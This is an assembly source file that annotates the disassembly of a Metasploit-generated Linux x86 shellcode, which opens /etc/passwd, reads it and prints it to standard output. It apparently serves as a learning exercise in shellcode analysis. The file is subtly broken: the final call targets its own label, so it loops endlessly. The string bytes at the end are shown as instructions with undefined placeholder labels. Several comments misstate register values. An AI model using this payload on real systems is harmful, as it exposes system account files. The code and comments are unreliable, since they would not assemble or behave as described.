;Filename: read_file.nasm
;Nasm code obtained from: msfvenom -p linux/x86/read_file PATH=/etc/passwd -f c => Compile shellcode, run gbd, break at &code and use disassemble. 
;Author: MrSquid

global _start 

section .text

_start:
	jmp short function

shellcode:
	mov    eax,0x5 ;Moves 5 to eax (call syscall open)
	pop    ebx ;Ebx is assigned the content of the variable PATH (In this case, /etc/passwd)
	xor    ecx,ecx ;Clearing out ecx 
	int    0x80; open(/etc/passwd) is called 
	mov    ebx,eax ;Now eax is 3 (After open is set to 3, which is read), then it is assigned to ebx
	mov    eax,0x3 ;Again is set 3 to eax 
	mov    edi,esp ; Esp is moved to edi (top of stack)
	mov    ecx,edi ; edi is moved to ecx (buffer assigned to the function read)
	mov    edx,0x1000 ; Counter is set to 1000 in read (4096 bytes)
	int    0x80 ;Execution of read (3, edi, 10)
	mov    edx,eax ; Move 3 to edx
	mov    eax,0x4 ; Eax is now 4 which is write
	mov    ebx,0x1 ; Ebx is set to 1
	int    0x80 ; Write is called but not to modify the file write(1,ecx,edx)
	mov    eax,0x1 ;exit 
	mov    ebx,0x0
	int    0x80


function:   
	call   function ;Call function. What is below is never used
	das    
	gs je  somewhere
	das  
	jo     somewhere2
	jae    somewhere3
	ja     somewhere4
	add    BYTE PTR [eax],al


